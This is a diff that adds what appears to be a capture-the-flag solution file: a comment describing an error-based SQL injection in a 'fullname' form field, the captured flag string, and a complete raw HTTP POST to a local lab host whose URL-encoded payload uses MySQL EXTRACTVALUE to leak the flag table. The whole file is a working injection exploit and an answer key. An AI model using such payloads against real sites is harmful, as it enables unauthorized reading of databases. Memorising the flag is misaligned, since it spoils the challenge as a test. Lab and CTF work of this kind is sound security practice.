@@ -1,0 +1,8 @@
+# Error-based SQLi in fullname param. MySQL EXTRACTVALUE XPATH error discloses flag. Flag: flag{136e2ba7-b113-4c5a-95da-ae5ef8aaada5}
+
+POST /send.php HTTP/1.1
+Host: 172.17.0.1:42085
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+
+fullname=Test%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28SELECT+flag+FROM+challenge.flag+LIMIT+0%2C1%29%29%29--+-&email=test%40test.com&phone=1234567890&subject=test&message=test&submit=Send
